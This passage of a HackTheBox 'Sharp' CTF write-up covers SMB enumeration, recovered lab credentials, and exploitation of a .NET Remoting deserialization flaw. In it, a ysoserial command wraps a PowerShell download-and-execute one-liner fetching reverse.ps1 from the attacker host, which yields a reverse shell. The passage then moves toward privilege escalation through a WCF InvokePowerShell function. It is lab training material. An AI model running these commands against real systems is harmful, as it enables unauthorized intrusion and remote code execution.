+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span style=&#34;color:#ae81ff&#34;&gt;17763&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:SHARP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:Sharp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sharp&lt;span style=&#34;color:#ae81ff&#34;&gt;\l&lt;/span&gt;ars:G123HHrth234gRG 
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Started spidering plus with option:
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        DIR: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;print$&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        EXT: &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ico&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lnk&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;       SIZE: &lt;span style=&#34;color:#ae81ff&#34;&gt;51200&lt;/span&gt;
+SPIDER_P... 10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;     OUTPUT: /tmp/cme_spider_plus
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We made the &lt;code&gt;.json&lt;/code&gt; more readable by filtering out the time and file size.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/kali/HackTheBox/Sharp&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# cat 10.10.10.219_lars_spider.json | grep -v &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;time\|size&amp;#39;&lt;/span&gt; | grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;: {&amp;#39;&lt;/span&gt; | awk -F&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{print $2}&amp;#39;&lt;/span&gt;  
+IPC$			&lt;span style=&#34;color:#75715e&#34;&gt;# directory&lt;/span&gt;
+InitShutdown
+LSM_API_service
+PIPE_EVENTROOT&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;CIMV2SCM EVENT PROVIDER
+PSHost.132655164003465770.3392.DefaultAppDomain.powershell
+W32TIME_ALT
+Winsock2&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;CatalogChangeListener-154-0
+Winsock2&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;CatalogChangeListener-1dc-0
+Winsock2&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;CatalogChangeListener-268-0
+Winsock2&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;CatalogChangeListener-274-0
+Winsock2&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;CatalogChangeListener-36c-0
+Winsock2&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;CatalogChangeListener-42c-0
+atsvc
+epmapper
+eventlog
+lsass
+ntsvcs
+scerpc
+srvsvc
+vgauth-service
+wkssvc
+dev				&lt;span style=&#34;color:#75715e&#34;&gt;# directory&lt;/span&gt;
+Client.exe
+RemotingLibrary.dll
+Server.exe
+notes.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;While searching &lt;code&gt;lars&lt;/code&gt; files, only those in &lt;code&gt;\\dev&lt;/code&gt; seem important.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/HackTheBox/Sharp/smb/lars&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# smbclient -U &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lars&amp;#39;&lt;/span&gt; //10.10.10.219/dev G123HHrth234gRG                                    &lt;span style=&#34;color:#ae81ff&#34;&gt;130&lt;/span&gt; ⨯
+Try &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
+smb: &lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;gt;&lt;/span&gt; ls
+  .                                   D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Sun Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 06:30:13 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  ..                                  D        &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;  Sun Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 06:30:13 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  Client.exe                          A     &lt;span style=&#34;color:#ae81ff&#34;&gt;5632&lt;/span&gt;  Sun Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 05:25:01 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  notes.txt                           A       &lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;  Sun Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 08:59:02 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  RemotingLibrary.dll                 A     &lt;span style=&#34;color:#ae81ff&#34;&gt;4096&lt;/span&gt;  Sun Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 05:25:01 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  Server.exe                          A     &lt;span style=&#34;color:#ae81ff&#34;&gt;6144&lt;/span&gt;  Mon Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; 06:55:44 &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt;
+  
+&lt;span style=&#34;color:#75715e&#34;&gt;# notes.txt&lt;/span&gt;
+Todo:
+    Migrate from .Net remoting to WCF	&lt;span style=&#34;color:#75715e&#34;&gt;# This might be our hint&lt;/span&gt;
+    Add input validation
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Two executables &lt;code&gt;Client.exe&lt;/code&gt; and &lt;code&gt;Server.exe&lt;/code&gt;, as well as their library, are also built in C#  so we can decompile them with dnSpy.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-02.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Then we have a &lt;em&gt;secret&lt;/em&gt; endpoint listening on port &lt;code&gt;8888&lt;/code&gt; with its username and password hardcoded in &lt;code&gt;Client.exe&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-06.png&#34; alt=&#34;Client.exe&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The credentials are to be tested with CME whether they are valid.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_10-12.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;credentials-acquired-1&#34;&gt;Credentials acquired&lt;/h3&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Username&lt;/th&gt;
+&lt;th&gt;Password&lt;/th&gt;
+&lt;th&gt;Status&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;debug&lt;/td&gt;
+&lt;td&gt;SharpApplicationDebugUserPassword123!&lt;/td&gt;
+&lt;td&gt;Valid&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Administrator&lt;/td&gt;
+&lt;td&gt;G2@$btRSHJYTarg&lt;/td&gt;
+&lt;td&gt;Invalid&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;lars&lt;/td&gt;
+&lt;td&gt;G123HHrth234gRG&lt;/td&gt;
+&lt;td&gt;Valid&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;exploit-local-net-debug-service&#34;&gt;Exploit local .NET debug service&lt;/h2&gt;
+&lt;p&gt;As &lt;code&gt;debug&lt;/code&gt; profile contains nothing but some useless folders (&lt;code&gt;IPC$&lt;/code&gt;, &lt;code&gt;dev&lt;/code&gt; and similarities for lars), we have to figure out how to connect to the endpoint on port 8888. Back to the &lt;code&gt;notes.txt&lt;/code&gt;, I thought there is something to do with the .NET service and came across these two repos. You can take a look yourselves.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/tyranid/ExploitRemotingService&#34;&gt;https://github.com/tyranid/ExploitRemotingService&lt;/a&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;A tool to exploit .NET Remoting Services vulnerable to CVE-2014-1806 or CVE-2014-4149. It only works on Windows although some aspects &lt;em&gt;might&lt;/em&gt; work in Mono on *nix.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://github.com/frohoff/ysoserial&#34;&gt;https://github.com/frohoff/ysoserial&lt;/a&gt; (basically our payload wrapper)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;ysoserial&lt;/strong&gt; is a collection of utilities and property-oriented programming &amp;ldquo;gadget chains&amp;rdquo; discovered in common java libraries that can, under the right conditions, exploit Java applications performing &lt;strong&gt;unsafe deserialization&lt;/strong&gt; of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;We will use &lt;em&gt;ysoserial&lt;/em&gt; to wrap our reverse-tcp PowerShell one-liner&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt; and call &lt;em&gt;ExploitRemotingService.exe&lt;/em&gt; to pipe our wrapped payload into the mentioned vulnerable endpoint.&lt;/p&gt;
+&lt;h3 id=&#34;payload-crafting-and-network-configuration&#34;&gt;Payload crafting and Network configuration&lt;/h3&gt;
+&lt;h4 id=&#34;useful-poc2-repositories&#34;&gt;Useful PoC&lt;sup id=&#34;fnref:2&#34;&gt;&lt;a href=&#34;#fn:2&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;2&lt;/a&gt;&lt;/sup&gt; repositories&lt;/h4&gt;
+&lt;p&gt;Because ExploitRemotingService doesn&amp;rsquo;t provide us any release versions so we have to download and build the project manually with Visual Studio on our Windows VM&lt;sup id=&#34;fnref:3&#34;&gt;&lt;a href=&#34;#fn:3&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;3&lt;/a&gt;&lt;/sup&gt;.&lt;/p&gt;
+&lt;p&gt;Additionally, I have to install &lt;a href=&#34;http://www.ndesk.org/Options&#34;&gt;NDesk Options&lt;/a&gt; library in order to successfully compile the solution.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-27.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;ysoserial&lt;/code&gt; has their portable version so we can simply download, unzip and use it.&lt;/p&gt;
+&lt;p&gt;Here is a brief look of &lt;code&gt;Server.exe&lt;/code&gt; source code decompiled by dnSpy. The server is running on port &lt;code&gt;8888&lt;/code&gt; with BinaryFormatter sink implemented. You can read about the details &lt;a href=&#34;https://docs.microsoft.com/en-us/dotnet/api/system.runtime.remoting.channels.binaryserverformattersink?view=netframework-4.8&#34;&gt;here&lt;/a&gt;; simply put, we just need &lt;code&gt;ysoserial&lt;/code&gt; to wrap our payload in BinaryFormatter mode.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_11-41.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Below is our crafting steps with &lt;code&gt;ysoserial&lt;/code&gt; and &lt;code&gt;ExploitRemotingService&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;### ysoserial.exe&lt;/span&gt;
+C:\Users\User\Desktop\ysoserial-1.34\Release&amp;gt;ysoserial.exe &lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; BinaryFormatter -g TypeConfuseDelegate -o base64 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;powershell IEX(new-object net.webclient).downloadString(&amp;#39;http://10.10.16.3/reverse.ps1&amp;#39;)&amp;#34;&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Breakdown&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;-f&lt;/span&gt; Formatter as BinaryFormatter
+-g TypeConfuseDelegate gadget
+-o Base64 output
+-c Create a reverse connection back to our IP using Powershell one-liner called reverse.ps1
+IEX(New-Object Net.WebClient).downloadString(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://10.10.16.3/reverse.ps1&amp;#39;&lt;/span&gt;)
+
+
+&lt;span style=&#34;color:#75715e&#34;&gt;### ExploitRemotingService.exe&lt;/span&gt;
+C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Release&amp;gt;ExploitRemotingService.exe -s --user=debug --pass=&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SharpApplicationDebugUserPassword123!&amp;#34;&lt;/span&gt; tcp&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;//10.10.10.219&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;8888/SecretSharpDebugApplicationEndpoint raw &amp;lt;wrapped payload&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;network-re-routing-on-windows-and-linux&#34;&gt;Network re-routing on Windows and Linux&lt;/h4&gt;
+&lt;p&gt;Before we can send our payload to target host, remember that currently our Linux machine is the only one can connect to HTB VPN, not our Windows. In order to establish a connection between Windows and HTB VPN, we have to do some routing.&lt;/p&gt;
+&lt;p&gt;The following section helps us turn Kali into a router and act as the gateway.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Windows&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# We want to route any HTB connection to our Kali machine NAT-IP&lt;/span&gt;
+C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\W&lt;/span&gt;indows&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;route add 10.10.10.0 mask 255.255.255.0 192.168.157.133
+ OK!
+
+&lt;span style=&#34;color:#75715e&#34;&gt;#	----------------------------------------------&lt;/span&gt;
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Linux&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Enable IP Forwarding&lt;/span&gt;
+$ echo &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; | sudo tee /proc/sys/net/ipv4/ip_forward 
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Configurate iptables&amp;#39; rules to manage incomming packets&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# This rule forwards packets from HTB to our Windows machine&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Breakdown: Forwarding chain for connection from tun0 to eth0 interface with related and/or established state&lt;/span&gt;
+$ iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT 
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Accept packets sending back from Windows machine&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Breakdown: Receive packets from Windows through eth0 interface then pass it on tun0 and send them to HTB&lt;/span&gt;
+$ iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT
+
+&lt;span style=&#34;color:#75715e&#34;&gt;# Re-routing NAT from HTB machine back to Windows&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;# Breakdown: Create a NAT table with POSTROUTING chain that accept only IP from the source of eth0 and pass it through tun0 with MASQUERADE policy&lt;/span&gt;
+$ iptables -t nat -A POSTROUTING -s 192.168.157.0/24 -o tun0 -j MASQUERADE 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;powershell-reverse-connection&#34;&gt;PowerShell Reverse Connection&lt;/h3&gt;
+&lt;p&gt;Finally, our Windows is able to send/receive packets from HTB machine through Kali.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_12-49.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now we can send our payload to target remote host and wait for our reverse shell.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;### ExploitRemotingService.exe&lt;/span&gt;
+C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;ser&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;esktop&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;xploitRemotingService-master&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;xploitRemotingService&lt;span style=&#34;color:#ae81ff&#34;&gt;\b&lt;/span&gt;in&lt;span style=&#34;color:#ae81ff&#34;&gt;\R&lt;/span&gt;elease&amp;gt;ExploitRemotingService.exe -s --user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;debug --pass&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SharpApplicationDebugUserPassword123!&amp;#34;&lt;/span&gt; tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw &amp;lt;wrapped payload&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After execute the above command, we has established a reverse PowerShell as user &lt;code&gt;lars&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_13-17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Browsing through &lt;code&gt;lars&lt;/code&gt; directories, there is a &lt;code&gt;wcf&lt;/code&gt; folder in Documents. This has also been mentioned in &lt;code&gt;notes.txt&lt;/code&gt; about migrating the project from dotNET to WCF, so it might be the answer. Anyway, the machine&amp;rsquo;s user flag is located in &lt;code&gt;C:\Users\lars\Desktop\user.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;    Directory&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; C:\Users\lars\Documents\wcf
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+d-----       11/15/2020   1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;40 PM                .vs                                                                   
+d-----       11/15/2020   1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;40 PM                Client                                                                
+d-----       11/15/2020   1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;40 PM                packages                                                              
+d-----       11/15/2020   1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;40 PM                RemotingLibrary                                                       
+d-----       11/15/2020   1&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;41 PM                Server                                                                
+-a----       11/15/2020  12&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt;47 PM           2095 wcf.sln                                                               
+
+
+PS C:\Users\lars\Documents\wcf&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s compress the wcf directory into &lt;code&gt;wcf.zip&lt;/code&gt; then download it to our Linux shared directory&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-09.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;another-secret-endpoint-and-flag&#34;&gt;Another secret endpoint and &amp;hellip;flag!&lt;/h3&gt;
+&lt;p&gt;It turns out &lt;code&gt;wcf.zip&lt;/code&gt; is also a C# project with source code inside, we can put it in Visual Studio and view the source. There is another secret endpoint that is currently running on port 8889 of the remote host.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Since we are in the same network with remote target, you can try change the IP to the machine (10.10.10.219) and run the code. But there is a problem.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We can&amp;rsquo;t connect to our target because of invalid credentials. This program was meant to run as internal users of the remote host (like &lt;code&gt;lars&lt;/code&gt; or &lt;code&gt;debug&lt;/code&gt;). To impersonate &lt;code&gt;lars&lt;/code&gt;, we will run our command-prompt with his net-username as following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Also type lars password when prompted&lt;/span&gt;
+C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\W&lt;/span&gt;indows&lt;span style=&#34;color:#ae81ff&#34;&gt;\s&lt;/span&gt;ystem32&amp;gt;runas /user:lars /netonly %ComSpec%
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-33.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Now we are &lt;code&gt;lars&lt;/code&gt; in his server, move to our malformed &lt;code&gt;wcf&lt;/code&gt; project and run it again.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://github.com/legiahuyy/image-host/raw/main/2021-5-14-HTB-Sharp/2021-05-15_14-36.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Successfully executed as &lt;code&gt;lars&lt;/code&gt;. Now we will use the project&amp;rsquo;s built-in function &lt;code&gt;InvokePowerShell&lt;/code&gt; to escalate our privilege.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; InvokePowerShell(&lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; scriptText)
+        {
+            Runspace runspace = RunspaceFactory.CreateRunspace();
+            runspace.Open();
+            Pipeline pipeline = runspace.CreatePipeline();
+            pipeline.Commands.AddScript(scriptText);
+            pipeline.Commands.Add(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Out-String&amp;#34;&lt;/span&gt;);
+            Collection &amp;lt;PSObject&amp;gt; results = pipeline.Invoke();
+            runspace.Close();
+            StringBuilder stringBuilder = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; StringBuilder();
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;foreach&lt;/span&gt; (PSObject obj &lt;span style=&#34;color:#66d9ef&#34;&gt;in&lt;/span&gt; results)
+            {
+                stringBuilder.AppendLine(obj.ToString());
+            }
+            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; stringBuilder.ToString();
+        }
+    }
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;Client.cs&lt;/code&gt; is to be changed as below:&lt;/p&gt;
